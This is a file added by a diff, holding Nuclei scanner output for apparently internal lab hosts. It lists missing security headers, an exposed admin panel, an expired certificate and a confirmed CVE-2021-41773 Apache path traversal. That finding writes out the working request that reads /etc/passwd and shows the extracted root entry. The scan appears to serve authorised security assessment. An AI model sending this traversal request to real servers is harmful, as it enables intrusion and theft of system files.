@@ -1,0 +1,31 @@
+NUCLEI SCAN OUTPUT
+
+[INF] Current nuclei version: v3.4.10
+[INF] Current nuclei-templates version: v10.2.7
+[INF] Targets loaded for current scan: 3
+
+[tech-detect:nginx] [http] [info] https://portal.interno.local
+[http-missing-security-headers:content-security-policy] [http] [info] https://portal.interno.local/login
+[http-missing-security-headers:x-frame-options] [http] [info] https://portal.interno.local/login
+
+[exposed-panels:admin-panel] [http] [medium] https://admin.interno.local/
+[api-docs:swagger-ui] [http] [info] https://api.interno.local/swagger/index.html
+
+[cve-2021-41773] [http] [high] http://10.10.20.30/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+[INF] Template: CVE-2021-41773
+[INF] Name: Apache HTTP Server 2.4.49 Path Traversal
+[INF] Severity: high
+[INF] Tags: cve,cve2021,apache,lfi
+[INF] Matcher: status-and-body
+[INF] Matched-at: http://10.10.20.30/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+[INF] Extracted-results: root:x:0:0:root:/root:/bin/bash
+[INF] Reference: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+[INF] Reference: https://httpd.apache.org/security/vulnerabilities_24.html
+
+[ssl-expired] [ssl] [medium] admin.interno.local:443
+[INF] Subject CN: admin.interno.local
+[INF] SAN: admin.interno.local, portal.interno.local
+[INF] Issuer CN: Internal-Lab-CA
+
+[INF] Template repository: https://github.com/projectdiscovery/nuclei-templates
+[INF] Scan completed in 7.84s. 7 findings reported.
